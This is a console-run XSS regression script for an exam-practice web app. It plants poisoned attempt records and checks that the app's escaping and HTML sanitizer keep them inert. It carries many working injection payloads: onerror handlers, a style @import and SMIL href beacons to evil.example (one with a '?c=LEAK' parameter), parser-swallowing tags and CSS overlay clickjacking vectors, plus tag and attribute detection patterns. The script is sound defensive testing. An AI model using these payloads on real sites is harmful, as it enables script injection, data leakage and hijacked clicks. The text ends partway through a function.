/* tests/injection-proof.js — manual XSS regression proof.
   No test runner is wired up yet (CLAUDE.md), so this is a paste-into-the-
   console script. Run it against dist/index-live.html.

   WHY THIS EXISTS
   Attempt records live in artifact shared storage, which ATTEMPTS-SPEC §7
   states is writable by anyone who can run the artifact. So every value read
   back out of a record — SPR answer strings, student codes, testName — is
   untrusted input, even though sanitizeSpr() limits what a student can type
   through the UI. This script plants a hostile record and walks every render
   surface that displays record-derived data, asserting the payload stays
   inert text.

   HOW TO RUN
   1. Open dist/index-live.html.
   2. Paste this whole file into the console and press Enter.
   3. Read the printed report. Every surface must show PASS.
   Covers record-derived text (SPR answers, codes, testName), test-data text
   (rationale via fmt), the student:<CODE> display name, and the Review Mode
   replay of a completed record's annotations (hostile passage HTML through
   the sanitizer, hostile note id/snippet/text through escaping) driven
   through the real Score Details -> chip -> test-UI path.
   NOTE: run this with local mode active (no config.js beside the page), since
   it uses the acestem-admin route, which a remote deployment removes.
   4. Reload the page afterwards (the script cleans its own storage keys).   */
(function(){
  "use strict";

  const PAYLOAD  = '"><img src=x onerror="window.__XSS_FIRED=true"><b data-x=\'y\'>PWN</b>';
  const ATTR_PAY = '1" onfocus="window.__ATTR_FIRED=true" x="';   // attribute-context probe
  window.__XSS_FIRED = false;
  window.__ATTR_FIRED = false;

  /* localStorage-backed stand-in for artifact shared storage */
  window.storage = {
    async set(k, v){ localStorage.setItem("as:" + k, v); return true; },
    async get(k){ const v = localStorage.getItem("as:" + k); return v === null ? null : { value: v }; },
    async list(p){
      const ks = [];
      for(let i = 0; i < localStorage.length; i++){
        const k = localStorage.key(i);
        if(k && k.indexOf("as:" + p) === 0) ks.push(k.slice(3));
      }
      return { keys: ks };
    },
    async delete(k){ localStorage.removeItem("as:" + k); return true; }
  };
  const clean = () => Object.keys(localStorage)
    .filter(k => k.indexOf("as:") === 0).forEach(k => localStorage.removeItem(k));

  /* A surface passes when the payload produced no live element and no event
     handler. Seeing the payload as visible TEXT is the desired outcome. */
  function audit(label, root){
    const els = [...root.querySelectorAll("*")];
    const injected = root.querySelectorAll('img[src="x"]').length +
                     els.filter(e => e.tagName === "B" && e.textContent === "PWN").length;
    const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name))).length;
    const pass = injected === 0 && handlers === 0 && !window.__XSS_FIRED;
    return { surface: label, pass, injectedElements: injected, handlerAttrs: handlers };
  }

  function poisonedRecord(test, opts){
    const answers = {};
    let sprCount = 0;
    test.modules.forEach(m => m.questions.forEach((q, i) => {
      const noKey = (q.correctAnswer === null || q.correctAnswer === undefined);
      let given = null;
      if(!noKey){
        if(q.type === "spr"){ given = PAYLOAD; sprCount++; }      // hostile SPR answer
        else if(i % 4 === 0) given = null;
        else given = q.correctAnswer;
      }
      /* visitCount/changeCount/timeSpentSeconds are read straight off the
         record and reach the dashboard detail pane AND (since 2026-08-02) the
         Review Mode question header — same class as the score counts, so they
         carry the payload too. firstGiven differs from given so the
         "changed ×N" branch (which prints changeCount) actually renders.
         Question index 1 keeps REAL numbers, so the proof also covers the
         formatted-and-rendered path rather than only the rejected one. */
      answers[q.id] = { given, firstGiven: given === null ? "X" : null, correct: false, markedForReview: false,
        eliminated: [],
        timeSpentSeconds: i === 1 ? 161 : PAYLOAD,
        visitCount: i === 1 ? 3 : PAYLOAD,
        changeCount: PAYLOAD,
        blankReason: given === null ? "never-answered" : null };
    }));
    return { sprCount, rec: Object.assign({
      recordVersion: 1, attemptId: "attempt:" + test.testId + ":1700000001:xss1",
      student: { code: PAYLOAD, key: "AS-XSSTEST2" },                 // hostile student code
      testId: test.testId, testName: PAYLOAD,                     // hostile test name
      testVersion: test.testVersion, assignmentId: null, timing: 1.5,
      conditions: "proctored", startedAt: "2026-07-30T14:00:00.000Z",
      lastSavedAt: "2026-07-30T15:00:00.000Z", submittedAt: "2026-07-30T15:00:00.000Z",
      status: "completed", released: true, modules: [], answers,
      /* counts are record-derived too: a crafted record can put markup where a
         number belongs, and these reach markup without esc() */
      score: { correct: PAYLOAD, graded: 98, noKey: PAYLOAD,
        bySection: { "Reading and Writing": { correct: PAYLOAD, graded: "" },
                     "Math": { correct: PAYLOAD, graded: PAYLOAD } } },
      client: {}
    }, opts || {}) };
  }

  const wait = ms => new Promise(r => setTimeout(r, ms));
  const $ = id => document.getElementById(id);

  async function run(){
    const results = [];
    clean();
    /* Test content is lazy-loaded per test now, so fetch the first one in the
       manifest through the app's own loader rather than reading a global that
       no longer exists. Poisoning happens on the loaded object, exactly as it
       did on window.TEST_DATA[0]. */
    if(!window.AppTestLoader || !Array.isArray(window.TEST_MANIFEST) || !window.TEST_MANIFEST.length){
      throw new Error("no test manifest/loader — open the app first, then paste this");
    }
    const test = await window.AppTestLoader.load(window.TEST_MANIFEST[0]);

    /* future-content fields: rationale goes through fmt(), which must escape
       prose while still honouring {{i}}/{{m}} tokens; an SPR correctAnswer
       comes from test data and reaches the table + banner */
    let firstQ = null, firstSpr = null;
    test.modules.forEach(m => m.questions.forEach(q => {
      if(!firstQ){ firstQ = q; q.rationale = PAYLOAD + " {{i}}italic{{/i}} {{m}}x^2{{/m}}"; }
      if(!firstSpr && q.type === "spr"){ firstSpr = q; q.correctAnswer = PAYLOAD; }
    }));

    /* Hostile ANNOTATIONS on the completed record (new 2026-08-02): finalize
       keeps the sitting's highlights/notes on the record, and Review Mode
       replays them in the real test UI — passage HTML through the resume
       sanitizer, note id/snippet/text through escaping. Plant them on the
       first question that HAS a passage (the only place they render). */
    /* The annotation plant needs a question of its OWN. Module 0 questions 0
       and 1 are already reserved by the per-question-time and rationale
       probes, which audit the whole right pane; since highlighting now stores
       stem and choice markup that replays INTO that pane, planting there would
       make those probes count this plant's (correctly sanitized, legitimately
       kept) <b> as injection. Pick the first passage question outside them. */
    const RESERVED = { "0:0": 1, "0:1": 1 };
    let annQ = null, annMi = -1, annQi = -1;
    test.modules.forEach((m, mi) => m.questions.forEach((q, qi) => {
      if(!annQ && q.passage && !RESERVED[mi + ":" + qi]){ annQ = q; annMi = mi; annQi = qi; }
    }));
    /* The <style> element is in here deliberately: it carries its payload in
       TEXT, so no attribute filter can see it, and injected via innerHTML its
       sheet applies to the WHOLE document — an @import is an outbound fetch
       (there is no CSP) and the rules can cover the app's own controls. It
       passed the sanitizer until 2026-08-02, and the detectors below missed
       it because STYLE was in none of their tag lists. */
    const STYLE_PAY = '<style>@import url("https://evil.example/beacon.css");' +
      '#rvBackBtn{position:fixed;inset:0;opacity:0;width:100vw;height:100vh;z-index:99999}</style>';
    /* Highlighting covers the stem and individual choices as well as the
       passage (2026-08-08), so each of those is a separate stored-markup slot
       that Review Mode replays through innerHTML. Plant the same hostile
       payload in every one — a sanitizer applied to the passage but forgotten
       on the stem or a choice is exactly the gap this has to catch. */
    /* PLAINTEXT is a TOKENIZER switch, not an ordinary element: once the parser
       meets it every following byte becomes its text and no end tag closes it.
       An attribute filter therefore never touches it, and re-inserting it eats
       whatever the app rendered AFTER the restored fragment — plant it in the
       stem and the entire choice list disappears. It survived the sanitizer
       until 2026-08-08. It goes LAST in the payload on purpose: anything after
       it is swallowed at parse time, so the surviving-highlight assertion above
       would fail for the wrong reason if it came first. */
    const PLAINTEXT_PAY = '<plaintext>swallowed<xmp>also<listing>also';
    /* annotationHost() decides which region a selection belongs to by walking
       up with closest(), so #passageText / .q-text / .ctext / .choice are
       load-bearing structural hooks. Replayed markup that carries one can make
       a stem or a choice answer to closest("#passageText") and get itself saved
       into the passage slot, corrupting a region it never belonged to. */
    const HOOK_PAY = '<span id="passageText" class="q-text ctext choice passage-text">hook</span>';
    /* SMIL puts back what the URL-attribute filter takes away. <animate> and
       <set> carry their payload in attributeName/values/to — none of which are
       URL attributes — and animating "href" makes the anchor navigate on the
       animated value while getAttribute("href") still reads null. Planted in a
       choice the SVG IS the visible choice text, so the student's ordinary
       answering click leaves the sitting. It survived the sanitizer
       byte-identical until 2026-08-08. */
    const SMIL_PAY = '<svg width="120" height="20"><a>' +
      '<animate attributeName="href" values="https://evil.example/?c=LEAK" begin="0s" dur="30s" repeatCount="indefinite"/>' +
      '<set attributeName="xlink:href" to="https://evil.example/set"/>' +
      '<text x="2" y="14">click me</text></a></svg>';
    const HOSTILE_HTML = PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' + STYLE_PAY +
        '<span class="hl c-yellow" data-note-id="' + ATTR_PAY + '">kept highlight</span>' +
        HOOK_PAY + SMIL_PAY + PLAINTEXT_PAY;
    const hostileAnnotations = annQ ? { [test.modules[annMi].moduleId]: {
      passageHtml: { [annQ.id]: HOSTILE_HTML },
      stemHtml:    { [annQ.id]: HOSTILE_HTML },
      choiceHtml:  { [annQ.id]: { 0: HOSTILE_HTML, 2: HOSTILE_HTML } },
      notes: { [annQ.id]: [{ id: ATTR_PAY, snippet: PAYLOAD, text: PAYLOAD }] }
    } } : undefined;

    const { rec, sprCount } = poisonedRecord(test, { annotations: hostileAnnotations });
    localStorage.setItem("as:" + rec.attemptId, JSON.stringify(rec));

    /* display-name profile row (student:<CODE>) — a NEW untrusted string that
       reaches the welcome banner, test footer, Score Details hero, printed
       report header and the dashboard. Written by the tutor, but stored in the
       same records table every other value comes from, so it gets the same
       treatment as any record-derived text. */
    localStorage.setItem("as:student:AS-XSSTEST2", JSON.stringify({ displayName: PAYLOAD }));
    /* a second hostile profile with NO attempts — renders through the
       Students tab's zero-attempts card (profile-only union entry) */
    localStorage.setItem("as:student:AS-PRFLXSS2", JSON.stringify({ displayName: PAYLOAD }));
    /* hostile CODES living in storage KEY NAMES — shared storage lets anyone
       write any key, and the Students-tab union now parses codes out of
       student:<CODE> and assign:<CODE>:<id> keys and renders them as cards */
    localStorage.setItem("as:student:" + PAYLOAD, JSON.stringify({ displayName: "innocent" }));
    localStorage.setItem("as:assign:" + PAYLOAD + ":a1",
      JSON.stringify({ assignmentId: "a1", testId: "x", timing: 1 }));

    $("nameInput").value = "AS-XSSTEST2";
    $("signinBtn").click();
    await wait(900);

    results.push(audit("Home welcome banner (hostile display name)", $("welcomeMsg")));
    results.push(audit("Home user chip + avatar (hostile display name)",
      $("homeUserName").parentElement));
    /* Past cards live in two sections now: proctored sittings under Your
       Tests, everything else under Practice. Switch both toggles and take the
       card from wherever this record landed, so the proof follows the record
       rather than assuming a section. */
    document.querySelector('#practiceSeg .seg-btn[data-seg="past"]').click();
    document.querySelector('#testsSeg .seg-btn[data-seg="past"]').click();
    await wait(200);
    results.push(audit("Past card (testName, total, timing badge)", $("practiceCards")));
    results.push(audit("Your Tests past card (testName, total, timing badge)", $("testCards")));

    const pastLink = document.querySelector("#practiceCards .pcard-link") ||
                     document.querySelector("#testCards .pcard-link");
    if(!pastLink) throw new Error("no Past card rendered — check the section split");
    pastLink.click();
    await wait(400);
    const root = $("sdRoot");
    $("sdShowCorrect").click();                                   // reveal correct-answer column
    [...root.querySelectorAll(".sd-view-btn")].find(b => b.textContent === "All").click();
    results.push(audit("Score Details hero + Knowledge and Skills", root));
    results.push(audit("Questions Overview table (SPR given + correct)", root));

    /* print output renders this same DOM; the print stylesheet only toggles
       visibility and adds one static ::before, so no new interpolation */
    results.push(audit("Print output (same DOM as Score Details)", root));

    /* ---- Review Mode (2026-08-02): the one review surface — a read-only
       replay of the record in the real test UI. Three drives through the
       real chip -> review path, each against a different hostile class. ---- */

    /* 1. Hostile SPR answer (record `given`) + hostile SPR key (test
       `correctAnswer`): input value attribute, answer preview, verdict line.
       Everything here is escaped, so plain audit() is the right assertion. */
    let sprMi = -1, sprQi = -1;
    test.modules.forEach((m, mi) => m.questions.forEach((q, qi) => {
      if(sprMi === -1 && q.type === "spr"){ sprMi = mi; sprQi = qi; }
    }));
    if(sprMi !== -1){
      root.querySelector(`.sd-chip[data-mi="${sprMi}"][data-qi="${sprQi}"]`).click();
      await wait(450);
      results.push(audit("Review Mode SPR (hostile given + hostile key)", $("paneRight")));
      const inp = $("sprInput");
      results.push({ surface: "Review Mode SPR input round-trips hostile value inert",
        pass: !!inp && inp.readOnly && inp.value === PAYLOAD && !inp.hasAttribute("onerror"),
        note: inp ? "readonly input holds the payload as a plain value" : "no sprInput rendered" });
      $("rvBackBtn").click();
      await wait(350);
    }

    /* 1b. Per-question time in the review header (2026-08-02). Two records'
       worth of shapes in one place: q0 carries a hostile timeSpentSeconds and
       visitCount, q1 carries real numbers (161s, 3 visits). The hostile pair
       must render an em-dash — NOT "NaN:NaN", which is inert but reads like a
       genuine measurement — and the real pair must format as 2:41 with the
       visit count. */
    root.querySelector('.sd-chip[data-mi="0"][data-qi="1"]').click();
    await wait(450);
    const realTime = document.querySelector("#paneRight .rv-time");
    const realTxt = realTime ? realTime.textContent.replace(/\s+/g, " ").trim() : "";
    results.push(audit("Review Mode per-question time (real values)", $("paneRight")));
    results.push({ surface: "Per-question time formats m:ss with visit count",
      pass: /^Time:\s*2:41\b/.test(realTxt) && /\(3 visits\)/.test(realTxt),
      note: realTime ? "rendered: " + realTxt : "no .rv-time in the header band" });
    $("rvBackBtn").click();
    await wait(350);

    root.querySelector('.sd-chip[data-mi="0"][data-qi="0"]').click();
    await wait(450);
    const badTime = document.querySelector("#paneRight .rv-time");
    const badTxt = badTime ? badTime.textContent.replace(/\s+/g, " ").trim() : "";
    results.push(audit("Review Mode per-question time (hostile values)", $("paneRight")));
    results.push({ surface: "Hostile time/visit values print an em-dash, never a reading",
      pass: !!badTime && badTxt.indexOf("—") !== -1 &&
            !/\d/.test(badTxt) && badTxt.indexOf("NaN") === -1 &&
            badTxt.indexOf("PWN") === -1,
      note: badTime ? "rendered: " + badTxt : "no .rv-time in the header band" });
    $("rvBackBtn").click();
    await wait(350);

    /* 2. Hostile rationale on firstQ (module 0, question 0): fmt() must
       escape the prose and still honour {{i}}/{{m}} tokens, below the
       choices in the real pane. */
    root.querySelector('.sd-chip[data-mi="0"][data-qi="0"]').click();
    await wait(450);
    const rat = document.querySelector("#paneRight .rv-rationale");
    results.push(audit("Review Mode rationale (hostile HTML via fmt)", $("paneRight")));
    results.push({ surface: "fmt() escapes prose but keeps {{i}}/{{m}} tokens",
      pass: !!rat && !rat.querySelector("img") && !!rat.querySelector("i"),
      note: rat ? "rationale rendered below choices; tokens live, payload inert" : "no .rv-rationale found" });
    $("rvBackBtn").click();
    await wait(350);

    /* 3. Hostile ANNOTATIONS replayed from the completed record — the exact
       surface the redesign added. The passage pane is sanitized HTML, not
       escaped text, so audit() would miscount the payload's surviving <b> as
       injection; the correct assertion is the sanitizer's: nothing can
       execute or fetch, while the planted highlight span (real annotation
       markup) must SURVIVE. The notes rail is escaped text — audit() there. */
    if(annQ){
      root.querySelector(`.sd-chip[data-mi="${annMi}"][data-qi="${annQi}"]`).click();
      await wait(450);
      const pane = $("paneLeft").querySelector("#passageText") ||
                   document.querySelector("#paneRight .passage-text");
      const els = pane ? [...pane.querySelectorAll("*")] : [];
      const exec = els.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
      const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
      const urlAttrs = els.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
      const hlKept = pane && pane.querySelector("span.hl");
      results.push({ surface: "Review Mode replayed passage annotations sanitized",
        pass: !!pane && !exec.length && !handlers.length && !urlAttrs.length &&
              !!hlKept && !window.__XSS_FIRED,
        note: !pane ? "passage pane missing"
          : exec.length || handlers.length || urlAttrs.length
            ? `survived: ${exec.length} executable, ${handlers.length} handler(s), ${urlAttrs.length} url attr(s)`
            : "hostile markup defused, real highlight span survived the replay" });
      /* the stem and each highlighted choice are their own innerHTML sites —
         same sanitizer assertion, applied per region */
      function regionSafe(label, el){
        if(!el){ results.push({ surface: label, pass:false, note:"region not rendered" }); return; }
        const rs = [...el.querySelectorAll("*")];
        const ex = rs.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO|PLAINTEXT|XMP|LISTING|A|ANIMATE|ANIMATEMOTION|ANIMATETRANSFORM|SET|TITLE|NOEMBED|NOFRAMES|FOREIGNOBJECT)$/i.test(e.tagName));
        const hd = rs.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
        const ua = rs.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
        // structural hooks annotationHost() resolves regions with — see HOOK_PAY
        const hk = rs.filter(e => e.id === "passageText" ||
          [...e.classList].some(c => /^(passage-text|q-text|q-stimulus|ctext|choice|choices|q-lead)$/.test(c)));
        results.push({ surface: label,
          pass: !ex.length && !hd.length && !ua.length && !hk.length && !!el.querySelector("span.hl") && !window.__XSS_FIRED,
          note: ex.length || hd.length || ua.length || hk.length
            ? `survived: ${ex.length} executable, ${hd.length} handler(s), ${ua.length} url attr(s), ${hk.length} structural hook(s)`
            : "hostile markup defused, real highlight span survived" });
      }
      regionSafe("Review Mode replayed STEM annotations sanitized",
        document.querySelector("#paneRight .q-text"));
      regionSafe("Review Mode replayed CHOICE annotations sanitized",
        document.querySelector('#paneRight .choice[data-idx="0"] .ctext'));
      regionSafe("Review Mode replayed CHOICE annotations sanitized (2nd choice)",
        document.querySelector('#paneRight .choice[data-idx="2"] .ctext'));

      /* The stem carries the same PLAINTEXT payload. If it survived, everything
         the app rendered after the stem — the entire choice list — is swallowed
         into its text. Counting the choices is the direct check that it did
         not, and it fails loudly rather than quietly rendering a stray tag. */
      {
        const nChoices = document.querySelectorAll('#paneRight .choice').length;
        results.push({ surface: "Review Mode: <plaintext> in the stem does not swallow the choice list",
          pass: nChoices >= 2,
          note: nChoices >= 2 ? `${nChoices} choices still rendered after the poisoned stem`
                              : `only ${nChoices} choice(s) rendered — markup after the stem was swallowed` });
      }

      /* Direct battery against AppSanitize.html. The region checks above can
         only see what a REPLAY happens to render; these hit the filter itself,
         so a payload is caught even if no current surface would have shown it.
         Every entry must come back with no element able to carry or acquire a
         URL, and the result must be a FIXED POINT — sanitize(sanitize(x)) ===
         sanitize(x) — because the caller's assignment re-parses the string, and
         a fragment that changes on re-parse is one whose meaning changed. */
      {
        const S = window.AppSanitize && window.AppSanitize.html;
        const battery = {
          "SMIL animate href":     '<svg><a><animate attributeName="href" values="https://evil.example/x" dur="9s"/><text>t</text></a></svg>',
          "SMIL set xlink:href":   '<svg><a><set attributeName="xlink:href" to="https://evil.example/y"/><text>t</text></a></svg>',
          "SMIL animateTransform": '<svg><a><animateTransform attributeName="href" to="javascript:1"/></a></svg>',
          "SMIL on <use>":         '<svg><use><animate attributeName="xlink:href" values="#x"/></use></svg>',
          "bare anchor":           '<a href="https://evil.example">link</a>',
          "RCDATA <title>":        '<title><img src=x onerror=window.__XSS_FIRED=true></title>',
          "foreignObject":         '<svg><foreignObject><img src=x onerror=window.__XSS_FIRED=true></foreignObject></svg>',
          "noembed":               '<noembed><img src=x onerror=window.__XSS_FIRED=true></noembed>'
        };
        const bad = [];
        if(!S){ bad.push("AppSanitize.html not exposed"); }
        else Object.keys(battery).forEach(name => {
          const out = S(battery[name]);
          const el = document.createElement("div");
          el.innerHTML = out;   // inert here: the payload is already defused
          const live = [...el.querySelectorAll("*")].filter(n =>
            /^(A|ANIMATE|ANIMATEMOTION|ANIMATETRANSFORM|SET|TITLE|NOEMBED|NOFRAMES|FOREIGNOBJECT|IMG|SCRIPT|STYLE|IFRAME)$/i.test(n.tagName));
          if(live.length) bad.push(`${name}: ${live.map(n => n.tagName).join(",")} survived`);
          if(S(out) !== out) bad.push(`${name}: not a fixed point — re-sanitizing changed it again`);
        });
        results.push({ surface: "Sanitizer battery: SMIL/anchor/RCDATA vectors dropped, output is a fixed point",
          pass: bad.length === 0 && !window.__XSS_FIRED,
          note: bad.length ? bad.join(" | ") : `${Object.keys(battery).length} vectors defused, all stable on re-sanitize` });
      }

      /* The style ATTRIBUTE, which until 2026-08-09 was filtered by banning
         three substrings (url(, expression(, javascript:). That lost twice:
         an escaped `\000075rl(...)` and `image-set('...' 1x)` both reached
         Chrome as real requests, and a position:fixed full-viewport overlay
         planted in one choice made every click in the sitting answer that
         choice. It is an allowlist of properties now, so these assert on the
         SURVIVING declarations rather than on a banned-substring list. */
      {
        const S = window.AppSanitize && window.AppSanitize.html;
        const styleCases = [
          { name: "position:fixed viewport overlay",
            html: '<span style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:rgba(255,255,255,0.01)">x</span>',
            banned: /position|z-index|background|vw|vh/i },
          { name: "escaped url() in background-image",
            html: '<span style="background-image:' + String.fromCharCode(92) + '000075rl(https://evil.example/p)">x</span>',
            banned: /background|url|000075/i },
          { name: "image-set()",
            html: '<span style="background-image:image-set(&quot;https://evil.example/p&quot; 1x)">x</span>',
            banned: /background|image-set|evil/i },
          { name: "calc() smuggling",
            html: '<span style="height:calc(100vh - 1px)">x</span>', banned: /calc|vh/i },
          { name: "transform blow-up",
            html: '<span style="transform:scale(400);opacity:0.01">x</span>', banned: /transform|opacity/i },
          { name: "pointer-events + display:block",
            html: '<span style="pointer-events:auto;display:block">x</span>', banned: /pointer-events|display/i },
          { name: "offset beyond the cap",
            html: '<span class="katex vlist" style="top:-9999em">x</span>', banned: /top/i },
          { name: "size beyond the cap",
            html: '<span style="min-width:400em">x</span>', banned: /min-width/i },
          /* The overlay rebuilt entirely from ALLOWLISTED properties (2026-08-09).
             The first cap split trusted that only top/left/bottom/right can move
             a box. A negative margin moves it in flow, vertical-align moves an
             inline box, and padding manufactures hit area — so this div covered
             the choices above the one it was planted in and every click there
             recorded that choice. */
          { name: "margin/padding overlay",
            html: '<div style="margin-top:-20em;height:18em;width:40em;padding-left:40em">x</div>',
            banned: /margin|padding|40em|18em/i },
          { name: "vertical-align overlay",
            html: '<span style="vertical-align:14em;padding-left:40em;padding-top:8em">x</span>',
            banned: /vertical-align|padding/i },
          { name: "negative margin-left",
            html: '<span style="margin-left:-45em">x</span>', banned: /margin-left/i },
          /* the cap compared the bare number, so it was unit-blind: 10rem passed
             a cap of 10 and still moved 160px */
          { name: "unit-blind cap (rem)",
            html: '<span style="top:-10rem">x</span>', banned: /top/i }
        ];
        const styleBad = [];
        if(!S){ styleBad.push("AppSanitize.html not exposed"); }
        else styleCases.forEach(c => {
          const d = document.createElement("div");
          d.innerHTML = S(c.html);            // inert: already defused
          const el = d.querySelector("[style]");
          const surviving = el ? el.getAttribute("style") : "";
          if(c.banned.test(surviving)) styleBad.push(`${c.name}: kept "${surviving}"`);
        });
        /* and the other half of the contract: KaTeX's own declarations, which
           restored math depends on, must come through untouched. */
        const katexDecl = 'height:2.7em;margin-right:0.05em;vertical-align:-0.25em;top:-4.2029em;' +
                          'border-bottom-width:0.04em;padding-left:0.833em;min-width:0.853em';
        if(S){
          const d = document.createElement("div");
          d.innerHTML = S('<span style="' + katexDecl + '">m</span>');
          const kept = d.querySelector("[style]");
          const got = kept ? kept.getAttribute("style") : "(dropped)";
          if(got !== katexDecl) styleBad.push(`KaTeX declarations altered: "${got}"`);
        }
        results.push({ surface: "Style attribute: property allowlist holds, KaTeX declarations survive",
          pass: styleBad.length === 0 && !window.__XSS_FIRED,
          note: styleBad.length ? styleBad.join(" | ")
                                : `${styleCases.length} style vectors defused, all 7 KaTeX properties preserved` });
      }

      /* The CLASS attribute. Until 2026-08-09 this was a denylist of eight
         structural hooks, which could not see that the app's own stylesheet
         defines .qnav-overlay { position:fixed; inset:0; z-index:50 } and
         .modal-overlay / .fig-overlay at z-index 120, all unscoped. A record
         carrying nothing but class="qnav-overlay" therefore rendered a
         full-viewport fixed layer with NO style attribute at all: in a choice
         every click on screen answered that choice, in the passage it swallowed
         clicks so Next and Back could not be reached. It is an allowlist now.
         Both directions are asserted: chrome classes must go, and the KaTeX and
         highlight vocabularies must survive or restored annotations break. */
      {
        const S = window.AppSanitize && window.AppSanitize.html;
        const classBad = [];
        const mustGo = ["qnav-overlay", "modal-overlay", "fig-overlay", "qnav-popup",
                        "t-footer", "hl-popup", "choice", "ctext", "q-text", "passage-text",
                        "dir-overlay", "elim-btn", "screen", "pill",
                        /* KaTeX's vocabulary, which the allowlist admitted until
                           2026-08-09 "so an upgrade cannot lose a fraction bar".
                           Every one of these is a positioning or sizing primitive in
                           KaTeX's own stylesheet: .rlap>.inner / .llap>.inner /
                           .clap>.inner / .halfarrow-left / .brace-left are
                           position:absolute, .stretchy is position:relative +
                           display:block + width:100%, and sizing/reset-size<n>/size<n>
                           multiply font-size by up to 4.976x per level, compounding —
                           which inflates every em-based cap underneath them. None of
                           it can occur legitimately: annotations are Reading-and-Writing
                           only, and no RW field in the library contains math. */
                        "katex", "katex-display", "katex-html", "katex-mathml",
                        "mord", "mfrac", "frac-line", "vlist", "vlist-t2", "pstrut",
                        "reset-size1", "reset-size6", "size3", "size11", "sizing",
                        "mathnormal", "delimsizing", "sqrt", "stretchy",
                        "rlap", "llap", "clap", "inner", "halfarrow-left", "brace-left"];
        const mustStay = ["hl", "c-yellow", "c-blue", "c-pink", "c-none",
                          "u-solid", "u-dashed", "u-dotted",
                          "fmt-blank", "fmt-bullets", "fmt-caption",
                          "fmt-passage-label", "fmt-quote", "fmt-table", "fmt-tnote"];
        if(!S){ classBad.push("AppSanitize.html not exposed"); }
        else {
          mustGo.forEach(c => {
            const d = document.createElement("div");
            d.innerHTML = S('<span class="' + c + '">x</span>');
            const el = d.querySelector("span");
            const got = el ? (el.getAttribute("class") || "") : "";
            if(got.split(/\s+/).indexOf(c) !== -1) classBad.push(`chrome class "${c}" survived`);
          });
          mustStay.forEach(c => {
            const d = document.createElement("div");
            d.innerHTML = S('<span class="' + c + '">x</span>');
            const el = d.querySelector("span");
            const got = el ? (el.getAttribute("class") || "") : "";
            if(got.split(/\s+/).indexOf(c) === -1) classBad.push(`legit class "${c}" was DROPPED`);
          });
          /* and the whole-payload form: a fixed overlay must not survive in any
             attribute, so nothing it renders can win hit-testing */
          const d = document.createElement("div");
          d.innerHTML = S('<span class="qnav-overlay"></span>choice text');
          const el = d.querySelector("span");
          if(el && el.getAttribute("class")) classBad.push("qnav-overlay payload kept a class");
        }
        results.push({ surface: "Class attribute: allowlist strips chrome + KaTeX, keeps highlight/fmt vocabulary",
          pass: classBad.length === 0 && !window.__XSS_FIRED,
          note: classBad.length ? classBad.join(" | ")
                                : `${mustGo.length} dangerous classes dropped, ${mustStay.length} legitimate classes preserved` });
      }

      /* The two overlays the 2026-08-09 review built ENTIRELY out of what the
         allowlist permitted. Neither uses a banned substring or an out-of-cap
         value: the reach comes from KaTeX classes granting position:absolute,
         and from the sizing trio multiplying font-size so a "6em" box the
         filter scores as 120px renders 532px. Asserted on the rendered result,
         not on the string, because that is where the harm lives. */
      {
        const S = window.AppSanitize && window.AppSanitize.html;
        const payloads = {
          "stretchy layer":
            '<span class="katex"><span class="sizing reset-size1 size11">' +
            '<span class="stretchy" style="top:-3em;height:6em"></span></span></span>',
          "rlap/inner absolute layer":
            '<span class="katex"><span class="sizing reset-size1 size11"><span class="rlap">' +
            '<span class="inner" style="top:-3em;left:-3em;width:6em;height:6em"></span></span></span></span>'
        };
        const bad = [];
        if(!S) bad.push("AppSanitize.html not exposed");
        else Object.keys(payloads).forEach(name => {
          const host = document.createElement("span");
          host.className = "ctext";
          host.style.cssText = "position:absolute;left:-4000px;top:0;width:480px;";
          document.body.appendChild(host);
          host.innerHTML = S(payloads[name]);
          [...host.querySelectorAll("*")].forEach(e => {
            const cs = getComputedStyle(e);
            if(cs.position === "absolute" || cs.position === "fixed")
              bad.push(`${name}: an element rendered position:${cs.position}`);
            if(parseFloat(cs.fontSize) > 40)
              bad.push(`${name}: font-size inflated to ${cs.fontSize}`);
            const r = e.getBoundingClientRect();
            if(r.width > 200 || r.height > 200)
              bad.push(`${name}: box ${Math.round(r.width)}x${Math.round(r.height)}`);
          });
          host.remove();
        });
        results.push({ surface: "Sanitized payloads cannot render a positioned or oversized box",
          pass: bad.length === 0, note: bad.length ? bad.join(" | ")
            : "both review overlays render static, un-inflated and zero-sized" });
      }

      /* DRIFT GATE. The allowlist is justified by a measurement: no Reading and
         Writing field in the library contains math, so fmt() emits only the
         seven fmt-* containers there. If a future test bank breaks that,
         restored annotations would silently lose their styling — so this fails
         loudly instead. It is the reason the allowlist can safely be this
         small. */
      {
        const S = window.AppSanitize && window.AppSanitize.html;
        const probe = document.createElement("div");
        probe.style.cssText = "position:absolute;left:-4000px;top:0;width:560px;";
        document.body.appendChild(probe);
        const dropped = new Map();
        let fields = 0;
        Object.keys(window.__TESTDATA__ || {}).forEach(tid => {
          const t = window.__TESTDATA__[tid];
          (t.modules || []).forEach(m => {
            if(m.section === "Math") return;               // annotation-free by design
            (m.questions || []).forEach(q => {
              const fs = [q.passage, q.questionText].concat(q.choices || []);
              fs.forEach((v, i) => {
                if(typeof v !== "string" || !v) return;
                fields++;
                let h; try{ h = fmt(v, i >= 2 ? { bigInline: true } : undefined); }catch(e){ return; }
                probe.innerHTML = h;
                const before = new Map();
                probe.querySelectorAll("[class]").forEach(e =>
                  e.getAttribute("class").split(/\s+/).filter(Boolean)
                    .forEach(tk => before.set(tk, (before.get(tk) || 0) + 1)));
                probe.innerHTML = S(h);
                const after = new Map();
                probe.querySelectorAll("[class]").forEach(e =>
                  e.getAttribute("class").split(/\s+/).filter(Boolean)
                    .forEach(tk => after.set(tk, (after.get(tk) || 0) + 1)));
                before.forEach((n, tk) => {
                  if((after.get(tk) || 0) < n) dropped.set(tk, (dropped.get(tk) || 0) + 1);
                });
              });
            });
          });
        });
        probe.remove();
